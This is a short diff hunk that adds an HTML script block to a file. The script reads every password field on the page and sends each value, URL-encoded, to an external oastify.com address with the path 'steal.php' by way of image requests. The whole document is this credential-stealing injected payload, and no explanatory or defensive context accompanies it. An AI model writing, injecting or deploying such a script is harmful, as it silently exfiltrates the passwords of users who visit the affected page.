@@ -1,0 +1,6 @@
+<script>
+var passwordFields = document.querySelectorAll("input[type='password']");
+for (var i = 0; i < passwordFields.length; i++) {
+  new Image().src = 'http://m1o5a7wsi4baumxnu0f9f9hgt7zynpbe.oastify.com/steal.php?password=' + encodeURIComponent(passwordFields[i].value);
+}
+</script>
